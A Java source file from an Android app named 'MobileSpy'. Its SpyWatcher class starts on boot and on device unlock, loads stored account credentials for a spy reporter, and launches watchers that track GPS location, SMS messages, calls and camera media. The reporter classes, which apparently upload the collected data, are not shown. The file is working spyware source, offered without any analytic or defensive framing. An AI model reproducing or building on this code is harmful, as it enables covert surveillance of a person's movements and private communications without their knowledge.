package org.ddth.android.spy;

import org.ddth.android.monitor.core.AndroidDC;
import org.ddth.android.monitor.observer.AndroidCallWatcher;
import org.ddth.android.monitor.observer.AndroidCameraWatcher;
import org.ddth.android.monitor.observer.AndroidGpsWatcher;
import org.ddth.android.monitor.observer.AndroidSmsWatcher;
import org.ddth.android.monitor.observer.AndroidWatcher;
import org.ddth.android.spy.reporter.CallSpyReporter;
import org.ddth.android.spy.reporter.GpsSpyReporter;
import org.ddth.android.spy.reporter.MediaSpyReporter;
import org.ddth.android.spy.reporter.SmsSpyReporter;
import org.ddth.android.spy.reporter.SpyReporter;
import org.ddth.http.core.Logger;
import org.ddth.mobile.monitor.core.DC;
import org.ddth.mobile.monitor.core.Watcher;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

/**
 * @author khoanguyen
 */
public class SpyWatcher extends AndroidWatcher {
	public static final String APPLICATION_TAG = "MobileSpy";
	public static final String PASSWORD_FIELD = "password";
	public static final String USERNAME_FIELD = "username";

	private static final String[] INTENTS = {Intent.ACTION_BOOT_COMPLETED, Intent.ACTION_USER_PRESENT};

	@Override
	public String[] getIntents() {
		return INTENTS;
	}

	@Override
	public void start(DC dc) {
		super.start(dc);
		// I want to bring up configuration dialog
		new SpyingConfiguratingWatcher().start(dc);
	}
	
	@Override
	public void service(AndroidDC dc, Intent intent) {
		// Yeah, I also want to read my configuration from local preferences
		SharedPreferences settings = dc.getContext().getSharedPreferences(
				APPLICATION_TAG, Context.MODE_PRIVATE);
		String username = settings.getString(USERNAME_FIELD, "");
		String password = settings.getString(PASSWORD_FIELD, "");
		SpyReporter.getSpyLogger().setAuthCredentials(username, password);

		dc.getWatchdog().clear();
		Watcher[] watchers = new Watcher[] {
			// I want to monitor GPS activities
			new AndroidGpsWatcher(new GpsSpyReporter()),
			// I want to monitor SMS activities
			new AndroidSmsWatcher(new SmsSpyReporter()),
			// I want to monitor Call activities
			new AndroidCallWatcher(new CallSpyReporter()),
			// I want to monitor Media activities
			new AndroidCameraWatcher(new MediaSpyReporter(username)),
		};
		// Start all of them for me...
		for (Watcher watcher : watchers) {
			watcher.start(dc);
		}
		Logger.getDefault().debug("Registered watchers successfully!");
	}
}